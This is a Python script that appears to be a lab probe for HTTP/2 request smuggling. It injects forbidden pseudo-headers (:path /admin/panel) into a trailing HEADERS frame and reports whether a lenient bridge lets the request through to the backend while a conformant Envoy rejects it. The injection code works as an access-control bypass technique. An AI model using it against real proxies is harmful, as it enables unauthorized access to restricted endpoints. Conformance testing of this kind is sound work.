"""TR.PSEUDO.MRG - Trailer Pseudo-Header Resurrection probe.

Sends H2c requests where the trailing HEADERS frame carries pseudo-headers
(:path, :authority) in violation of RFC 9113 §8.1.2.1. Compares how each
bridge in the matrix reacts.

Expected outcomes:
  h2_lenient_bridge  → ACCEPTED, :path override reaches backend → IMPACT:acl_bypass
  envoy_h2_frontend  → REJECTED via RST_STREAM PROTOCOL_ERROR (conformant)

Usage:
    python tr_pseudo_mrg_probe.py
    python tr_pseudo_mrg_probe.py --host localhost --lenient-port 18446 --envoy-port 18084
"""
from __future__ import annotations

import argparse
import socket
import struct

import hpack

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

_RST_NAMES = {0x0: "NO_ERROR", 0x1: "PROTOCOL_ERROR", 0x7: "REFUSED_STREAM"}


# ---------------------------------------------------------------------------
# Minimal frame primitives
# ---------------------------------------------------------------------------

def _pack(type_id: int, flags: int, sid: int, payload: bytes) -> bytes:
    length = len(payload)
    hdr = struct.pack(">I", length)[1:]
    hdr += bytes([type_id, flags])
    hdr += struct.pack(">I", sid & 0x7FFFFFFF)
    return hdr + payload


class _Reader:
    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.buf  = b""

    def next(self, timeout: float = 3.0) -> tuple[int, int, int, bytes]:
        self.sock.settimeout(timeout)
        while True:
            if len(self.buf) >= 9:
                length = (self.buf[0] << 16) | (self.buf[1] << 8) | self.buf[2]
                needed = 9 + length
                if len(self.buf) >= needed:
                    type_id  = self.buf[3]
                    flags    = self.buf[4]
                    sid      = struct.unpack(">I", self.buf[5:9])[0] & 0x7FFFFFFF
                    payload  = self.buf[9:needed]
                    self.buf = self.buf[needed:]
                    return type_id, flags, sid, payload
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                raise
            if not chunk:
                raise ConnectionError("closed")
            self.buf += chunk

    def drain(self, first_timeout: float = 2.5) -> list[tuple[int, int, int, bytes]]:
        frames: list[tuple[int, int, int, bytes]] = []
        t = first_timeout
        while True:
            try:
                frames.append(self.next(timeout=t))
                t = 0.4
            except (socket.timeout, ConnectionError):
                break
        return frames


# ---------------------------------------------------------------------------
# Core probe
# ---------------------------------------------------------------------------

def probe(
    host: str,
    port: int,
    trailer_pseudo: list[tuple[str, str]],
    label: str,
    initial_path: str = "/",
) -> dict:
    result: dict = {"label": label, "target": f"{host}:{port}", "outcome": "unknown"}

    try:
        sock = socket.create_connection((host, port), timeout=5.0)
    except Exception as e:
        result["outcome"] = f"connect_failed: {e}"
        return result

    with sock:
        reader = _Reader(sock)
        enc    = hpack.Encoder()   # one encoder per connection → shared HPACK context

        # Send client preface + SETTINGS
        client_settings = _pack(0x4, 0x0, 0, struct.pack(">HI", 0x6, 65536))
        window_upd      = _pack(0x8, 0x0, 0, struct.pack(">I", 65535))
        sock.sendall(H2_PREFACE + client_settings + window_upd)

        # Exchange SETTINGS ACK
        try:
            for _ in range(10):
                t, f, s, p = reader.next(timeout=2.0)
                if t == 0x4 and not (f & 0x1):   # SETTINGS without ACK
                    sock.sendall(_pack(0x4, 0x1, 0, b""))
                    break
                if t == 0x7:                       # GOAWAY during handshake
                    result["outcome"] = "goaway_on_connect"
                    return result
        except (socket.timeout, ConnectionError) as e:
            result["outcome"] = f"handshake_failed: {e}"
            return result

        # ----------------------------------------------------------------
        # Build stream 1:
        #   HEADERS (END_HEADERS, no END_STREAM)     ← normal request
        #   DATA    (no END_STREAM)                   ← body
        #   HEADERS (END_STREAM | END_HEADERS)        ← trailers with pseudo-headers ← RFC violation
        # ----------------------------------------------------------------

        init_hdrs = [
            (":method",    "GET"),
            (":path",      initial_path),
            (":authority", f"{host}:{port}"),
            (":scheme",    "http"),
        ]
        init_block    = enc.encode(init_hdrs)
        init_hf       = _pack(0x1, 0x4, 1, init_block)          # END_HEADERS

        body          = b"tr-pseudo-mrg"
        data_f        = _pack(0x0, 0x0, 1, body)                 # no flags

        trailer_block = enc.encode(trailer_pseudo)
        trailer_hf    = _pack(0x1, 0x1 | 0x4, 1, trailer_block) # END_STREAM | END_HEADERS

        sock.sendall(init_hf + data_f + trailer_hf)

        # Collect all response frames
        frames = reader.drain(first_timeout=2.5)
        result["frame_types"] = [t for t, _, _, _ in frames]

        dec        = hpack.Decoder()
        saw_rst    = False
        saw_goaway = False
        resp_status: int | None = None
        resp_hdrs:  dict[str, str] = {}
        resp_body:  bytes = b""

        for type_id, flags, sid, payload in frames:
            if type_id == 0x3:   # RST_STREAM
                ec = struct.unpack(">I", payload[:4])[0] if len(payload) >= 4 else -1
                saw_rst = True
                result["rst_error_code"] = ec
                result["rst_error_name"] = _RST_NAMES.get(ec, f"0x{ec:x}")
            elif type_id == 0x7: # GOAWAY
                ec = struct.unpack(">I", payload[4:8])[0] if len(payload) >= 8 else -1
                saw_goaway = True
                result["goaway_error_code"] = ec
                result["goaway_error_name"] = _RST_NAMES.get(ec, f"0x{ec:x}")
            elif type_id == 0x1: # HEADERS (response)
                try:
                    for name, value in dec.decode(payload):
                        if name == ":status":
                            resp_status = int(value)
                        else:
                            resp_hdrs[name] = value
                except Exception:
                    pass
            elif type_id == 0x0: # DATA
                resp_body += payload

        # Classify
        if saw_rst:
            result["outcome"] = "rejected_rst"
        elif saw_goaway:
            result["outcome"] = "rejected_goaway"
        elif resp_status is not None:
            result["outcome"] = "accepted"
            result["status"]  = resp_status
            body_s = resp_body.decode("latin-1", errors="replace")
            if "IMPACT:acl_bypass" in body_s or "BACKEND-MARKER admin" in body_s:
                result["impact"]        = "ACL_BYPASS_CONFIRMED"
                result["impact_detail"] = "trailer :path=/admin/panel reached backend"
            elif "IMPACT:" in body_s:
                result["impact"] = "IMPACT_OTHER"
                result["impact_detail"] = body_s.split("IMPACT:")[1][:60].strip()
            elif "BACKEND-MARKER" in body_s:
                result["backend_marker"] = body_s.split("BACKEND-MARKER")[1][:80].strip()
            _interesting = ("impact", "trailer", "routing", "marker", "pseudo", "effective", "override")
            result["resp_headers"]     = {k: v for k, v in resp_hdrs.items()
                                          if any(x in k for x in _interesting)}
            result["resp_body_preview"] = body_s[:400]
        else:
            result["outcome"] = "no_response"

    return result


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

def _print(r: dict) -> None:
    w = 67
    print(f"\n{'─'*w}")
    print(f"  Target  : {r['label']}")
    print(f"  Address : {r['target']}")
    print(f"  Outcome : {r['outcome']}")
    if "rst_error_name" in r:
        print(f"  RST     : {r['rst_error_name']}  (0x{r['rst_error_code']:x})")
    if "goaway_error_name" in r:
        print(f"  GOAWAY  : {r['goaway_error_name']}  (0x{r['goaway_error_code']:x})")
    if "status" in r:
        print(f"  HTTP    : {r['status']}")
    if "impact" in r:
        print(f"  ★ IMPACT : {r['impact']}")
        print(f"             {r['impact_detail']}")
    if "backend_marker" in r:
        print(f"  Backend : {r['backend_marker']}")
    for k, v in r.get("resp_headers", {}).items():
        print(f"  Hdr     : {k}: {v}")
    if "resp_body_preview" in r:
        print(f"  Body    : {r['resp_body_preview'][:200]}")
    print(f"{'─'*w}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(description="TR.PSEUDO.MRG probe")
    parser.add_argument("--host",         default="localhost")
    parser.add_argument("--lenient-port", type=int, default=18446)
    parser.add_argument("--envoy-port",   type=int, default=18084)
    args = parser.parse_args()

    trailer_pseudo = [
        (":path",      "/admin/panel"),
        (":authority", "internal.local"),
    ]

    print("TR.PSEUDO.MRG - Trailer Pseudo-Header Resurrection")
    print(f"Injecting in trailing HEADERS frame (RFC 9113 §8.1.2.1 violation):")
    for k, v in trailer_pseudo:
        print(f"  {k}: {v}")
    print(f"Initial :path = /  (benign)")

    targets = [
        (args.lenient_port, "h2_lenient_bridge  (buggy - no §8.1.2.1 check)"),
        (args.envoy_port,   "envoy_h2_frontend   (conformant)"),
    ]

    results = []
    for port, label in targets:
        r = probe(args.host, port, trailer_pseudo, label)
        _print(r)
        results.append(r)

    print(f"\n{'━'*67}")
    print("  Summary")
    print(f"{'━'*67}")
    for r in results:
        if "impact" in r:
            tag = f"★ VULN  ({r['impact']})"
        elif "rejected" in r["outcome"]:
            tag = "  SAFE  (rejected)"
        else:
            tag = f"  {r['outcome'].upper()}"
        print(f"  {tag:<38}  {r['label']}")
    print(f"{'━'*67}\n")


if __name__ == "__main__":
    main()
